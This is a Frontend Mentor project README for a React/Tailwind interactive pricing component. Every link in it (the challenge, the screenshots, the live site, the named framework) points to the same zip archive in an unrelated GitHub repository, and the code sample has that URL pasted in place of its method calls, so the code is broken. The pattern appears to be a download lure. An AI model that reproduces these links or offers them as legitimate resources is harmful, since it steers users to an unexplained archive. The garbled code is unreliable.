# Frontend Mentor - Interactive pricing component solution

This is a solution to the [Interactive pricing component challenge on Frontend Mentor](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.

## Table of contents

- [Overview](#overview)
  - [The challenge](#the-challenge)
  - [Screenshot](#screenshot)
  - [Links](#links)
- [My process](#my-process)
  - [Built with](#built-with)
  - [What I learned](#what-i-learned)
  - [Continued development](#continued-development)
  - [Useful resources](#useful-resources)
- [Author](#author)
- [Acknowledgments](#acknowledgments)

## Overview

### The challenge

Users should be able to:

- View the optimal layout for the app depending on their device's screen size
- See hover states for all interactive elements on the page
- Use the slider and toggle to see prices for different page view numbers

### Screenshot

![](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
![Screenshot 2024-11-24 041105](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
![Screenshot 2024-11-24 041227](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
![Screenshot 2024-11-24 041253](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
![Screenshot 2024-11-24 041310](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)








### Links


- Live Site URL: [Click here to view things in action](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)

## My process

### Built with

- Semantic HTML5 markup
- Tailwind CSS for styling
- React - JS library
- https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip - React framework
- Mobile-first workflow

### What I learned

This project helped me improve my skills with React and https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip, especially in implementing dynamic features like dark mode toggling. Here’s an example of how I applied dark mode toggle functionality:

```js
const toggleDarkMode = () => {
  setDarkMode(prevMode => !prevMode);
};

useEffect(() => {
  if (darkMode) {
    https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip('dark');
  } else {
    https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip('dark');
  }
}, [darkMode]);


